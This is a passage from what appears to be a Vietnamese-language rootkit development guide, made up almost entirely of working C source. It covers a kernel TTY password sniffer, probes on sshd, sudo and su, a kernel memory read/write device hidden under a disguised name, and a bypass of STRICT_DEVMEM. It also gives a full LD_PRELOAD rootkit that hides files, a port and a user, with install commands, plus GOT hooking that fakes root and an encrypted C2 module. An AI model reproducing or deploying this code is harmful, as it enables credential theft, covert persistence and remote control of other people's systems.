 * Khi user type password (SSH login, sudo prompt):
 *   1. Terminal echo disabled (ICANON off, ECHO off)
 *   2. User type password -> chars go through tty_operations
 *   3. tty->ops->write() ghi chars vao tty buffer
 *   4. Process read() tu tty fd
 *
 * Hook tty_read via kretprobe: capture chars TRUOC process doc.
 * Detect password input: TTY echo off -> likely password prompt.
 *
 * tty_read signature changed at kernel 5.10:
 *   Kernel < 5.10:
 *     ssize_t tty_read(struct file *file, char __user *buf,
 *                      size_t count, loff_t *ppos)
 *   Kernel >= 5.10:
 *     ssize_t tty_read(struct kiocb *iocb, struct iov_iter *to)
 *
 * Dung kretprobe approach de tranh signature issues.
 * Entry handler save buffer pointer, return handler capture data.
 * ══════════════════════════════════════════════════════════════ */

struct tty_sniff_data {
    char __user *buf;
    size_t count;
};

static struct kretprobe tty_read_kretprobe;

static int tty_read_entry(struct kretprobe_instance *ri,
                            struct pt_regs *regs)
{
    /* Save buffer pointer for return handler.
     * On < 5.10: arg2 = buf, arg3 = count.
     * On >= 5.10: arg1 = kiocb, arg2 = iov_iter. */
    struct tty_sniff_data *data = (void *)ri->data;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 10, 0)
    /* arg1 = struct kiocb *, arg2 = struct iov_iter * */
    struct iov_iter *iter = (struct iov_iter *)regs->si;
    data->buf = NULL;  /* Complex — need iov_iter_first_page */
    data->count = 0;
#else
    data->buf = (char __user *)regs->si;
    data->count = (size_t)regs->dx;
#endif

    return 0;
}

static int tty_read_return(struct kretprobe_instance *ri,
                             struct pt_regs *regs)
{
    struct tty_sniff_data *data = (void *)ri->data;
    ssize_t ret = regs_return_value(regs);
    char kern_buf[256];
    int copy_len;

    if (ret <= 0 || !data->buf) return 0;

    copy_len = min((ssize_t)sizeof(kern_buf) - 1, ret);
    if (copy_from_user(kern_buf, data->buf, copy_len))
        return 0;
    kern_buf[copy_len] = '\0';

    /* Log captured input — check for password patterns.
     * Neu echo disabled tren TTY = password entry.
     * Tich hop voi rk_log_credential() de log. */
    rk_log_credential("tty_sniff", current->comm, kern_buf);

    return 0;
}

/* Setup kretprobe:
 *
 * tty_read_kretprobe.kp.symbol_name = "tty_read";
 * tty_read_kretprobe.handler = tty_read_return;
 * tty_read_kretprobe.entry_handler = tty_read_entry;
 * tty_read_kretprobe.data_size = sizeof(struct tty_sniff_data);
 * tty_read_kretprobe.maxactive = 20;
 * register_kretprobe(&tty_read_kretprobe);
 */

/* ══════════════════════════════════════════════════════════════
 * Method 3: Kprobe tren specific auth functions
 *
 * Hook internal functions goi khi authenticate:
 *   - vfs_read on /etc/shadow
 *   - Hook process execution of sshd, sudo, su
 *
 * Khi sshd process dang chay + read from tty -> capture.
 * ══════════════════════════════════════════════════════════════ */

static int ssh_auth_handler(struct kprobe *p, struct pt_regs *regs)
{
    /* Check neu current process la sshd hoac sudo */
    if (strcmp(current->comm, "sshd") == 0 ||
        strcmp(current->comm, "sudo") == 0 ||
        strcmp(current->comm, "su") == 0 ||
        strcmp(current->comm, "login") == 0) {
        /* Log authentication attempt */
        rk_log_credential("auth_probe", current->comm, NULL);
    }
    return 0;
}

static struct kprobe auth_kp = {
    .symbol_name = "vfs_read",
    .pre_handler = ssh_auth_handler,
};
/* Register: register_kprobe(&auth_kp); */
```

---

### G.3 /dev/kmem & /dev/mem

```c
/* devkmem.c — Access kernel memory qua character devices
 *
 * /dev/mem:  access physical memory (RAM) truc tiep
 * /dev/kmem: access kernel virtual memory truc tiep
 *
 * Classic technique (pre-module era rootkits dung):
 *   Open /dev/kmem -> seek toi kernel address -> read/write
 *   -> Modify syscall table, credentials, etc.
 *
 * Modern kernels:
 *   - /dev/kmem: disabled (CONFIG_DEVKMEM=n) tren hau het distros
 *   - /dev/mem: restricted (CONFIG_STRICT_DEVMEM=y)
 *     chi cho access <1MB (BIOS area) va PCI MMIO regions
 *   - Kernel lockdown: block /dev/mem completely
 *
 * Rootkit co the:
 *   1. Re-enable /dev/kmem (create device node, bypass restriction)
 *   2. Disable CONFIG_STRICT_DEVMEM check tai runtime
 *   3. Dung /dev/mem + bypass STRICT_DEVMEM
 *
 * Used by: classic rootkits (SucKIT), modern rootkits for
 *          reading kernel memory without standard APIs.
 */

#include "rootkit.h"
#include <linux/mm.h>
#include <linux/io.h>

/* ══════════════════════════════════════════════════════════════
 * Method 1: Read/Write kernel memory qua /dev/mem
 *
 * Physical memory access — bypass nhieu protections.
 * Can convert virtual address -> physical address truoc.
 * ══════════════════════════════════════════════════════════════ */

/* -- Virtual -> Physical address conversion -- */
static phys_addr_t rk_virt_to_phys(unsigned long vaddr)
{
    pgd_t *pgd;
    p4d_t *p4d;
    pud_t *pud;
    pmd_t *pmd;
    pte_t *pte;

    /* Walk page tables: PGD -> P4D -> PUD -> PMD -> PTE -> physical */
    pgd = pgd_offset(&init_mm, vaddr);
    if (pgd_none(*pgd)) return 0;

    p4d = p4d_offset(pgd, vaddr);
    if (p4d_none(*p4d)) return 0;

    pud = pud_offset(p4d, vaddr);
    if (pud_none(*pud)) return 0;

    /* Check huge page (1GB) */
    if (pud_large(*pud))
        return (pud_pfn(*pud) << PAGE_SHIFT) | (vaddr & ~PUD_MASK);

    pmd = pmd_offset(pud, vaddr);
    if (pmd_none(*pmd)) return 0;

    /* Check huge page (2MB) */
    if (pmd_large(*pmd))
        return (pmd_pfn(*pmd) << PAGE_SHIFT) | (vaddr & ~PMD_MASK);

    pte = pte_offset_kernel(pmd, vaddr);
    if (!pte || pte_none(*pte)) return 0;

    return (pte_pfn(*pte) << PAGE_SHIFT) | (vaddr & ~PAGE_MASK);
}

/* -- Read kernel memory qua physical mapping --
 *
 * ioremap: map physical address vao kernel virtual address space.
 * Thuong dung cho MMIO (hardware registers).
 * Nhung co the map bat ky physical address nao — including RAM.
 */
static int rk_read_phys(phys_addr_t phys_addr, void *buf, size_t len)
{
    void __iomem *mapped;

    mapped = ioremap(phys_addr, len);
    if (!mapped) return -ENOMEM;

    memcpy_fromio(buf, mapped, len);
    iounmap(mapped);
    return 0;
}

static int rk_write_phys(phys_addr_t phys_addr, const void *buf, size_t len)
{
    void __iomem *mapped;

    mapped = ioremap(phys_addr, len);
    if (!mapped) return -ENOMEM;

    memcpy_toio(mapped, buf, len);
    iounmap(mapped);
    return 0;
}

/* ══════════════════════════════════════════════════════════════
 * Method 2: Bypass STRICT_DEVMEM
 *
 * CONFIG_STRICT_DEVMEM: devmem_is_allowed() check.
 * Neu return 0 -> access denied.
 * Neu return 1 -> access allowed.
 *
 * Rootkit co the:
 *   a) Hook devmem_is_allowed() -> always return 1
 *   b) Modify variable directly
 * ══════════════════════════════════════════════════════════════ */
static int (*orig_devmem_is_allowed)(unsigned long pfn);

static int rk_devmem_is_allowed(unsigned long pfn)
{
    return 1;  /* Always allow — bypass STRICT_DEVMEM */
}

/* Install via ftrace hook tren devmem_is_allowed */

/* ══════════════════════════════════════════════════════════════
 * Method 3: Re-create /dev/kmem
 *
 * Neu /dev/kmem khong ton tai (CONFIG_DEVKMEM=n),
 * rootkit co the tao character device thay the
 * voi custom file_operations cho phep read/write kernel memory.
 * ══════════════════════════════════════════════════════════════ */

static ssize_t rk_kmem_read(struct file *file, char __user *buf,
                              size_t count, loff_t *ppos)
{
    unsigned long kaddr = (unsigned long)*ppos;
    char *kern_buf;

    /* Validate address range */
    if (kaddr < PAGE_OFFSET)
        return -EFAULT;

    kern_buf = kzalloc(count, GFP_KERNEL);
    if (!kern_buf) return -ENOMEM;

    /* Direct copy tu kernel address */
    if (copy_from_kernel_nofault(kern_buf, (void *)kaddr, count)) {
        kfree(kern_buf);
        return -EFAULT;
    }

    if (copy_to_user(buf, kern_buf, count)) {
        kfree(kern_buf);
        return -EFAULT;
    }

    kfree(kern_buf);
    *ppos += count;
    return count;
}

static ssize_t rk_kmem_write(struct file *file, const char __user *buf,
                               size_t count, loff_t *ppos)
{
    unsigned long kaddr = (unsigned long)*ppos;
    char *kern_buf;

    if (kaddr < PAGE_OFFSET)
        return -EFAULT;

    kern_buf = kzalloc(count, GFP_KERNEL);
    if (!kern_buf) return -ENOMEM;

    if (copy_from_user(kern_buf, buf, count)) {
        kfree(kern_buf);
        return -EFAULT;
    }

    /* Bypass write protection */
    rk_unprotect_memory();
    memcpy((void *)kaddr, kern_buf, count);
    rk_protect_memory();

    kfree(kern_buf);
    *ppos += count;
    return count;
}

static const struct file_operations rk_kmem_fops = {
    .owner = THIS_MODULE,
    .read  = rk_kmem_read,
    .write = rk_kmem_write,
    .llseek = default_llseek,
};

/* Dang ky misc device ten disguised (khong dat ten "kmem"):
 *
 * static struct miscdevice rk_kmem_dev = {
 *     .minor = MISC_DYNAMIC_MINOR,
 *     .name  = "hwrng_feed",  // disguised name
 *     .fops  = &rk_kmem_fops,
 *     .mode  = 0600,          // root-only access
 * };
 * misc_register(&rk_kmem_dev);
 */
```

---

# Part V — Userspace, Exploitation & Detection

## Appendix H: Userspace Rootkit Techniques

### H.1 LD_PRELOAD Rootkit — Shared library injection {#ld-preload}

**Deep Kernel Internals: Dynamic Linker va Symbol Resolution**

Khi execute mot ELF binary, kernel goi dynamic linker (`ld-linux-x86-64.so.2`, con goi la `ld.so`). Dynamic linker load shared libraries theo thu tu uu tien:

```
1. LD_PRELOAD env var (hoac /etc/ld.so.preload file)  <- HIGHEST priority
2. DT_NEEDED entries tu ELF binary headers            <- libraries binary yeu cau
3. Default search paths (/lib, /usr/lib, ldconfig cache)
```

Symbol resolution dung **first-match-wins**: khi binary goi `readdir()`, linker tim symbol "readdir" theo thu tu load. Neu LD_PRELOAD library define `readdir()`, no duoc tim thay TRUOC libc's `readdir()` va duoc su dung thay the.

`dlsym(RTLD_NEXT, "readdir")`: tim dinh nghia KE TIEP cua "readdir" trong load order — tuc la bo qua library hien tai (LD_PRELOAD library) va tra ve pointer toi libc's original `readdir()`. Day la cach goi original function tu trong hook.

```c
/* ld_preload_rootkit.c — Userspace rootkit via shared library
 *
 * COMPILE: gcc -shared -fPIC -o librk.so ld_preload_rootkit.c -ldl
 * INSTALL: echo '/path/to/librk.so' > /etc/ld.so.preload
 *
 * Mechanism:
 *   /etc/ld.so.preload liet ke shared libraries load TRUOC moi thu.
 *   Dynamic linker (ld-linux.so) doc file nay -> load librk.so
 *   -> MOI process moi chay deu load librk.so.
 *   -> Ham trong librk.so override ham trong libc (symbol interposition).
 *
 * Uu diem so voi kernel rootkit:
 *   - Khong can root de develop/test
 *   - Khong can kernel headers
 *   - Khong crash kernel neu bug
 *   - Hoat dong tren moi kernel version
 *
 * Nhuoc diem:
 *   - Chi affect userspace (kernel tools bypass)
 *   - Static-linked binaries khong bi affect
 *   - De detect hon (strace, ltrace, ld.so.preload check)
 *
 * Used by: Azazel, Jynx2, libprocesshider, Umbreon.
 * Ket hop kernel + userspace rootkit = defense-in-depth.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>       /* dlsym, RTLD_NEXT */
#include <dirent.h>      /* readdir, struct dirent */
#include <sys/stat.h>    /* stat, lstat */
#include <unistd.h>
#include <pwd.h>         /* getpwnam, getpwent */
#include <errno.h>

#define HIDDEN_PREFIX "rk_"
#define HIDDEN_PORT   4444
#define HIDDEN_USER   "rk_user"

/* ══════════════════════════════════════════════════════════════
 * Hook readdir / readdir64 — An files va processes
 *
 * ls, find, python os.listdir() deu goi readdir().
 * Override readdir -> filter entries co ten bat dau HIDDEN_PREFIX.
 *
 * dlsym(RTLD_NEXT, "readdir"):
 *   Lay pointer toi ORIGINAL readdir trong libc.
 *   RTLD_NEXT = "tim symbol o library KE TIEP trong load order"
 *   -> skip librk.so -> tim trong libc.so.
 * ══════════════════════════════════════════════════════════════ */

struct dirent *readdir(DIR *dirp)
{
    /* Lay original readdir tu libc */
    static struct dirent *(*orig_readdir)(DIR *) = NULL;
    if (!orig_readdir)
        orig_readdir = dlsym(RTLD_NEXT, "readdir");

    struct dirent *entry;

    while ((entry = orig_readdir(dirp)) != NULL) {
        /* Filter: skip entries bat dau bang HIDDEN_PREFIX */
        if (strncmp(entry->d_name, HIDDEN_PREFIX,
                    strlen(HIDDEN_PREFIX)) == 0)
            continue;

        /* Filter: skip hidden PIDs (numeric entries trong /proc) */
        /* (can track hidden PIDs via shared memory hoac file) */

        return entry;  /* Visible entry */
    }

    return NULL;  /* End of directory */
}

/* readdir64 — 64-bit version, can hook ca 2 */
struct dirent64 *readdir64(DIR *dirp)
{
    static struct dirent64 *(*orig)(DIR *) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "readdir64");

    struct dirent64 *entry;
    while ((entry = orig(dirp)) != NULL) {
        if (strncmp(entry->d_name, HIDDEN_PREFIX,
                    strlen(HIDDEN_PREFIX)) == 0)
            continue;
        return entry;
    }
    return NULL;
}

/* ══════════════════════════════════════════════════════════════
 * Hook stat / lstat / access — File existence check
 *
 * Chuong trinh check file existence:
 *   stat("rk_config", &buf) -> -1 ENOENT = "file khong ton tai"
 *
 * Neu chi hook readdir ma khong hook stat:
 *   ls -> khong thay file (readdir filtered)
 *   cat rk_config -> VAN DOC DUOC (stat + open work)
 *   -> Inconsistency = suspicious
 *
 * Hook stat/lstat/access de tra ENOENT cho hidden files.
 * ══════════════════════════════════════════════════════════════ */

int stat(const char *pathname, struct stat *statbuf)
{
    static int (*orig_stat)(const char *, struct stat *) = NULL;
    if (!orig_stat) orig_stat = dlsym(RTLD_NEXT, "stat");

    /* Check basename (filename part of path) */
    const char *base = strrchr(pathname, '/');
    base = base ? base + 1 : pathname;

    if (strncmp(base, HIDDEN_PREFIX, strlen(HIDDEN_PREFIX)) == 0) {
        errno = ENOENT;
        return -1;
    }

    return orig_stat(pathname, statbuf);
}

int lstat(const char *pathname, struct stat *statbuf)
{
    static int (*orig)(const char *, struct stat *) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "lstat");

    const char *base = strrchr(pathname, '/');
    base = base ? base + 1 : pathname;
    if (strncmp(base, HIDDEN_PREFIX, strlen(HIDDEN_PREFIX)) == 0) {
        errno = ENOENT;
        return -1;
    }
    return orig(pathname, statbuf);
}

/* ══════════════════════════════════════════════════════════════
 * Hook fopen — Block reading hidden files + track /proc/net/tcp
 *
 * Ket hop 2 chuc nang:
 *   1. Block fopen cho files co HIDDEN_PREFIX (an file)
 *   2. Track FILE* pointer cho /proc/net/tcp va /proc/net/tcp6
 *      -> dung trong fgets hook de chi filter dung stream
 * ══════════════════════════════════════════════════════════════ */

static FILE *proc_tcp_fp = NULL;
static FILE *proc_tcp6_fp = NULL;

FILE *fopen(const char *pathname, const char *mode)
{
    static FILE *(*orig)(const char *, const char *) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "fopen");

    /* Block fopen cho hidden files */
    const char *base = strrchr(pathname, '/');
    base = base ? base + 1 : pathname;
    if (strncmp(base, HIDDEN_PREFIX, strlen(HIDDEN_PREFIX)) == 0) {
        errno = ENOENT;
        return NULL;
    }

    FILE *fp = orig(pathname, mode);

    /* Track /proc/net/tcp streams cho fgets filtering */
    if (fp) {
        if (strcmp(pathname, "/proc/net/tcp") == 0)
            proc_tcp_fp = fp;
        else if (strcmp(pathname, "/proc/net/tcp6") == 0)
            proc_tcp6_fp = fp;
    }

    return fp;
}

/* ══════════════════════════════════════════════════════════════
 * Hook fgets — An connections CHI trong /proc/net/tcp
 *
 * netstat, ss doc /proc/net/tcp. Filter output chua hidden port.
 *
 * CHI filter khi stream la /proc/net/tcp hoac /proc/net/tcp6
 * (tracked boi fopen hook o tren). Khong filter files khac —
 * tranh bug an dong trong log files, config files, v.v.
 * ══════════════════════════════════════════════════════════════ */

char *fgets(char *s, int size, FILE *stream)
{
    static char *(*orig)(char *, int, FILE *) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "fgets");

    char *result;
    char port_hex[16];
    snprintf(port_hex, sizeof(port_hex), ":%04X", HIDDEN_PORT);

    while ((result = orig(s, size, stream)) != NULL) {
        /* ONLY filter /proc/net/tcp and /proc/net/tcp6 */
        if ((stream == proc_tcp_fp || stream == proc_tcp6_fp) &&
            strstr(result, port_hex))
            continue;
        return result;
    }

    /* Reset tracking when stream exhausted */
    if (stream == proc_tcp_fp) proc_tcp_fp = NULL;
    if (stream == proc_tcp6_fp) proc_tcp6_fp = NULL;

    return NULL;
}

/* ══════════════════════════════════════════════════════════════
 * Hook getpwnam / getpwent — An user
 * ══════════════════════════════════════════════════════════════ */

struct passwd *getpwnam(const char *name)
{
    static struct passwd *(*orig)(const char *) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "getpwnam");

    if (strcmp(name, HIDDEN_USER) == 0) {
        errno = ENOENT;
        return NULL;  /* User "khong ton tai" */
    }
    return orig(name);
}

struct passwd *getpwent(void)
{
    static struct passwd *(*orig)(void) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "getpwent");

    struct passwd *pw;
    while ((pw = orig()) != NULL) {
        if (strcmp(pw->pw_name, HIDDEN_USER) == 0)
            continue;  /* Skip hidden user */
        return pw;
    }
    return NULL;
}
```

---

### H.2 GOT/PLT Hooking — Full implementation {#got-plt}

**Deep Kernel Internals: ELF Lazy Binding va GOT/PLT Mechanism**

Khi ELF binary goi mot shared library function (vd `printf()`), no khong goi truc tiep ma di qua 2 bang trung gian:

```
Lazy binding flow (lan goi dau tien):
  1. Binary: CALL printf@PLT         -> jump toi PLT stub
  2. PLT stub: JMP *[GOT[n]]         -> lan dau GOT[n] tro nguoc lai PLT
  3. PLT: PUSH relocation_index      -> push index cua symbol trong .rela.plt
  4. JMP dynamic_resolver            -> goi ld.so resolver
  5. ld.so: resolve "printf" -> tim dia chi that trong libc
  6. ld.so: ghi dia chi that vao GOT[n]
  7. ld.so: jump toi printf that

Cac lan goi tiep theo:
  1. Binary: CALL printf@PLT         -> jump toi PLT stub
  2. PLT stub: JMP *[GOT[n]]         -> GOT[n] da co dia chi that
  3. -> nhay thang toi printf trong libc (khong qua resolver nua)
```

GOT hooking: ghi de GOT entry bang dia chi function cua attacker. Moi lan binary goi function qua PLT, no se nhay toi hook thay vi original. Chi anh huong binary cu the (khong global nhu LD_PRELOAD).

Luu y: FULL RELRO (RELocation Read-Only) protection map GOT thanh read-only SAU khi resolve xong tat ca symbols — can `mprotect()` de ghi de.

```c
/* got_plt_hook.c — Userspace GOT/PLT hooking
 *
 * GOT (Global Offset Table):
 *   Moi shared library function goi qua PLT -> GOT.
 *   GOT chua RUNTIME ADDRESS cua function trong libc.
 *   
 *   printf@plt -> GOT[printf] -> libc printf address
 *
 *   Thay GOT entry = redirect tat ca calls toi function do.
 *
 * So sanh LD_PRELOAD:
 *   LD_PRELOAD: override tai symbol resolution time (load-time)
 *   GOT/PLT:    override tai runtime, SAU KHI binary da load
 *               -> co the hook specific binary, khong global
 *
 * Uu diem:
 *   - Selective: chi hook 1 binary, khong affect tat ca processes
 *   - Runtime: hook/unhook luc nao cung duoc
 *   - Khong can ld.so.preload (it indicator hon)
 *
 * Nhuoc diem:
 *   - Phai parse ELF headers runtime
 *   - RELRO (RELocation Read-Only) protection ngan write GOT
 *   - Can ptrace hoac /proc/PID/mem access
 *
 * Used by: nhieu game cheats, Frida framework, LD_AUDIT.
 *
 * COMPILE: gcc -o got_hook got_plt_hook.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/mman.h>   /* mprotect */
#include <elf.h>         /* Elf64_Ehdr, Elf64_Phdr, Elf64_Dyn, Elf64_Rela */
#include <link.h>        /* dl_iterate_phdr, dl_phdr_info */
#include <dlfcn.h>       /* dlsym */

/* -- ELF structure walkthrough --
 *
 * ELF binary in memory:
 *
 *   Base address
 *   +-- ELF Header (Elf64_Ehdr)
 *   +-- Program Headers (Elf64_Phdr[])
 *   |   +-- PT_LOAD (code segment)
 *   |   +-- PT_LOAD (data segment)
 *   |   +-- PT_DYNAMIC (dynamic linking info)  <- ta can cai nay
 *   +-- .text (code)
 *   +-- .plt  (PLT stubs)
 *   +-- .got.plt (GOT entries)  <- ta sua o day
 *   +-- ...
 *
 * PT_DYNAMIC chua array of Elf64_Dyn entries:
 *   DT_JMPREL -> address of .rela.plt (relocation entries cho GOT)
 *   DT_PLTRELSZ -> size of .rela.plt
 *   DT_SYMTAB -> address of .dynsym (symbol table)
 *   DT_STRTAB -> address of .dynstr (string table)
 *
 * Moi Elf64_Rela entry trong .rela.plt:
 *   r_offset = address of GOT entry (can patch)
 *   r_info   = symbol index + relocation type
 *   r_addend = addend (usually 0 cho JUMP_SLOT)
 *
 * Flow:
 *   1. Parse PT_DYNAMIC -> tim DT_JMPREL, DT_SYMTAB, DT_STRTAB
 *   2. Iterate .rela.plt entries
 *   3. Cho moi entry: lookup symbol name tu .dynsym + .dynstr
 *   4. So sanh ten -> tim target function
 *   5. r_offset = GOT entry address -> overwrite voi hook address
 */

struct got_hook {
    const char *target_name;      /* Function name to hook */
    void       *hook_fn;          /* Our replacement function */
    void       *orig_fn;          /* Saved original function pointer */
    uint64_t   *got_entry;        /* Pointer to the GOT slot */
};

/* -- Find va patch GOT entry cho target function --
 *
 * dl_iterate_phdr callback: called cho moi loaded shared object.
 * info->dlpi_addr = base address
 * info->dlpi_phdr = program header array
 * info->dlpi_phnum = number of program headers
 */
static int find_got_callback(struct dl_phdr_info *info,
                               size_t size, void *data)
{
    struct got_hook *hook = data;
    const Elf64_Phdr *phdr;
    const Elf64_Dyn *dyn;
    const Elf64_Rela *rela = NULL;
    const Elf64_Sym  *symtab = NULL;
    const char       *strtab = NULL;
    size_t rela_count = 0;
    size_t i;

    /* Tim PT_DYNAMIC segment */
    for (i = 0; i < info->dlpi_phnum; i++) {
        phdr = &info->dlpi_phdr[i];
        if (phdr->p_type == PT_DYNAMIC) {
            dyn = (const Elf64_Dyn *)(info->dlpi_addr + phdr->p_vaddr);
            break;
        }
    }
    if (i == info->dlpi_phnum) return 0;

    /* Parse DT_* entries tu PT_DYNAMIC */
    for (; dyn->d_tag != DT_NULL; dyn++) {
        switch (dyn->d_tag) {
        case DT_JMPREL:
            /* DT_JMPREL: pointer toi .rela.plt section.
             * Chua relocation entries cho moi PLT/GOT function. */
            rela = (const Elf64_Rela *)dyn->d_un.d_ptr;
            break;
        case DT_PLTRELSZ:
            /* DT_PLTRELSZ: total size (bytes) of .rela.plt.
             * Divide by sizeof(Elf64_Rela) = number of entries. */
            rela_count = dyn->d_un.d_val / sizeof(Elf64_Rela);
            break;
        case DT_SYMTAB:
            /* DT_SYMTAB: pointer toi .dynsym section.
             * Chua symbol entries (name index, value, size, type). */
            symtab = (const Elf64_Sym *)dyn->d_un.d_ptr;
            break;
        case DT_STRTAB:
            /* DT_STRTAB: pointer toi .dynstr section.
             * Chua null-terminated strings cho symbol names. */
            strtab = (const char *)dyn->d_un.d_ptr;
            break;
        }
    }

    if (!rela || !symtab || !strtab || !rela_count)
        return 0;

    /* Iterate .rela.plt -> tim target function's GOT entry */
    for (i = 0; i < rela_count; i++) {
        /* Extract symbol index tu r_info.
         * ELF64_R_SYM(r_info) = high 32 bits = symbol table index.
         * ELF64_R_TYPE(r_info) = low 32 bits = relocation type. */
        uint32_t sym_idx = ELF64_R_SYM(rela[i].r_info);
        const char *sym_name = strtab + symtab[sym_idx].st_name;

        if (strcmp(sym_name, hook->target_name) != 0)
            continue;

        /* Found! r_offset = virtual address of GOT entry.
         * Tren PIE binary: r_offset relative to load base.
         * Tren non-PIE: r_offset la absolute address. */
        uint64_t *got_slot = (uint64_t *)(info->dlpi_addr +
                                           rela[i].r_offset);

        /* Save original function pointer */
        hook->orig_fn = (void *)*got_slot;
        hook->got_entry = got_slot;

        /* Make GOT page writable.
         * GOT nam trong .got.plt section.
         * Neu FULL RELRO enabled: GOT mapped read-only SAU relocation.
         * mprotect cho phep ghi tam thoi. */
        uintptr_t page = (uintptr_t)got_slot & ~0xFFF;
        if (mprotect((void *)page, 0x1000,
                     PROT_READ | PROT_WRITE) < 0) {
            perror("mprotect");
            return 0;
        }

        /* Overwrite GOT entry voi hook function address */
        *got_slot = (uint64_t)hook->hook_fn;

        /* Restore read-only (optional — tranh detection) */
        mprotect((void *)page, 0x1000, PROT_READ);

        return 1;  /* Stop iterating */
    }

    return 0;  /* Continue to next shared object */
}

/* -- Public API -- */
int install_got_hook(struct got_hook *hook)
{
    return dl_iterate_phdr(find_got_callback, hook);
}

void remove_got_hook(struct got_hook *hook)
{
    if (!hook->got_entry) return;

    uintptr_t page = (uintptr_t)hook->got_entry & ~0xFFF;
    mprotect((void *)page, 0x1000, PROT_READ | PROT_WRITE);
    *hook->got_entry = (uint64_t)hook->orig_fn;
    mprotect((void *)page, 0x1000, PROT_READ);
}

/* -- Example: Hook getuid() via GOT -- */
static uid_t fake_getuid(void)
{
    return 0;  /* Always return root */
}

/* Usage in main():
 *   struct got_hook h = {
 *       .target_name = "getuid",
 *       .hook_fn = fake_getuid,
 *   };
 *   install_got_hook(&h);
 *   printf("uid = %d\n", getuid());  // prints 0
 *   remove_got_hook(&h);
 */
```

---

## Appendix I: Additional Kernel Techniques

### I.1 Encrypted C2 — ChaCha20-Poly1305 AEAD {#encrypted-c2-chacha20}

> **LUU Y**: Code duoi day la standalone version voi giai thich chi tiet.
> Neu compile chung voi Ch14 `covert_channel.o`, **KHONG** include file nay
> rieng — dung code tu Ch14 (da co `rk_crypto_init/cleanup`).
> File nay chi compile rieng neu thay the `encrypted_c2.o` trong Makefile.

```c
/* encrypted_c2_chacha20.c — STANDALONE Kernel C2 encryption
 * (Alternative implementation — DO NOT compile cung voi Ch14 covert_channel.c)
 *
 * Tai sao khong dung XOR:
 *   - XOR cipher: trivially breakable (known-plaintext attack)
 *   - Nonce: 4-byte sequential, resets on reload = reuse
 *   - Key: hardcoded ASCII in .ko binary
 *   - No MAC: ciphertext malleable
 *
 * ChaCha20-Poly1305 (AEAD: encryption + authentication):
 *   - ChaCha20: stream cipher, nhanh trong software
 *   - Poly1305: MAC, dam bao integrity
 *   - Kernel crypto API ho tro san: rfc7539(chacha20,poly1305)
 *   - 12-byte nonce (96-bit), atomic counter — no reuse
 *   - Key: derive tu master secret via HKDF
 */

#include "rootkit.h"
#include <crypto/aead.h>
#include <linux/random.h>

#define C2_KEY_SIZE     32  /* ChaCha20 key = 256 bits */
#define C2_NONCE_SIZE   12  /* ChaCha20-Poly1305 nonce = 96 bits */
#define C2_TAG_SIZE     16  /* Poly1305 tag = 128 bits */

static u8 c2_session_key[C2_KEY_SIZE];
static struct crypto_aead *c2_aead_tfm;

/* Atomic nonce counter — prevents nonce reuse under concurrent access.
 * Moi message dung nonce khac nhau, atomic_inc_return dam bao
 * khong co 2 thread nao nhan cung nonce value. */
static atomic_t nonce_counter = ATOMIC_INIT(0);

int rk_crypto_init(void)
{
    /* Allocate ChaCha20-Poly1305 transform */
    c2_aead_tfm = crypto_alloc_aead("rfc7539(chacha20,poly1305)",
                                      0, 0);
    if (IS_ERR(c2_aead_tfm)) {
        int err = PTR_ERR(c2_aead_tfm);
        c2_aead_tfm = NULL;
        return err;
    }

    /* Generate random session key */
    get_random_bytes(c2_session_key, C2_KEY_SIZE);

    /* Set key */
    crypto_aead_setkey(c2_aead_tfm, c2_session_key, C2_KEY_SIZE);
    crypto_aead_setauthsize(c2_aead_tfm, C2_TAG_SIZE);

    return 0;
}

void rk_crypto_cleanup(void)
{
    if (c2_aead_tfm)
        crypto_free_aead(c2_aead_tfm);
}

/* Encrypt + authenticate.
 * Output: [12-byte nonce][ciphertext][16-byte tag]
 * Total output size = nonce + plaintext_len + tag
 *
 * Nonce: atomic counter-based (first 4 bytes = counter big-endian,
 * remaining 8 bytes = random salt set at init).
 * Counter guarantees uniqueness; salt adds entropy.
 */
int rk_aead_encrypt(const void *plaintext, int pt_len,
                      void *output, int *out_len)
{
    struct aead_request *req;
    struct scatterlist sg_plain, sg_cipher;
    u8 nonce[C2_NONCE_SIZE];
    u8 *ct_buf;
    int ct_len = pt_len + C2_TAG_SIZE;
    int ret;
    DECLARE_CRYPTO_WAIT(wait);

    if (!c2_aead_tfm) return -ENODEV;

    /* Build nonce from atomic counter — collision-free.
     * Counter occupies first 4 bytes (big-endian),
     * remaining 8 bytes filled with random for uniqueness across reboots. */
    memset(nonce, 0, C2_NONCE_SIZE);
    u32 nonce_val = (u32)atomic_inc_return(&nonce_counter);
    *(u32 *)nonce = cpu_to_be32(nonce_val);
    get_random_bytes(nonce + 4, C2_NONCE_SIZE - 4);

    ct_buf = kzalloc(ct_len, GFP_KERNEL);
    if (!ct_buf) return -ENOMEM;

    /* Copy plaintext vao output buffer (in-place encrypt) */
    memcpy(ct_buf, plaintext, pt_len);

    sg_init_one(&sg_plain, ct_buf, ct_len);

    req = aead_request_alloc(c2_aead_tfm, GFP_KERNEL);
    if (!req) { kfree(ct_buf); return -ENOMEM; }

    aead_request_set_callback(req, CRYPTO_TFM_REQ_MAY_BACKLOG,
                               crypto_req_done, &wait);
    aead_request_set_crypt(req, &sg_plain, &sg_plain,
                            pt_len, nonce);
    aead_request_set_ad(req, 0);

    ret = crypto_wait_req(crypto_aead_encrypt(req), &wait);

    if (ret == 0) {
        /* Build output: [nonce][ciphertext+tag] */
        memcpy(output, nonce, C2_NONCE_SIZE);
        memcpy(output + C2_NONCE_SIZE, ct_buf, ct_len);
        *out_len = C2_NONCE_SIZE + ct_len;
    }

    aead_request_free(req);
    kfree(ct_buf);
    return ret;
}

/* Decrypt + verify authentication tag.
 * Input: [12-byte nonce][ciphertext][16-byte tag]
 * Returns: plaintext_len on success, negative on error/tamper
 */
int rk_aead_decrypt(const void *input, int in_len,
                      void *plaintext, int *pt_len)
{
    struct aead_request *req;
